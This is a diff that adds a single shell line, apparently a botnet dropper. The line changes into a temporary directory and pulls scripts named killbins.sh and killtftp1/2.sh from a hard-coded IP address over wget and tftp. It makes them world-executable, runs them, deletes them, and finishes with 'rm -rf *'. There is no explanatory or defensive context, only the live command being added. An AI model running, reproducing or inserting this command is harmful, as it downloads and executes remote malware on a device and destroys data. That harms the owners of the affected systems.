@@ -1,0 +1,1 @@
+cd /tmp || cd /run || cd /; wget http://66.150.130.100/killbins.sh; chmod 777 killbins.sh; sh killbins.sh; tftp 66.150.130.100 -c get killtftp1.sh; chmod 777 killtftp1.sh; sh killtftp1.sh; tftp -r killtftp2.sh -g 66.150.130.100; chmod 777 killtftp2.sh; sh killtftp2.sh; rm -rf killbins.sh killtftp1.sh killtftp2.sh; rm -rf *
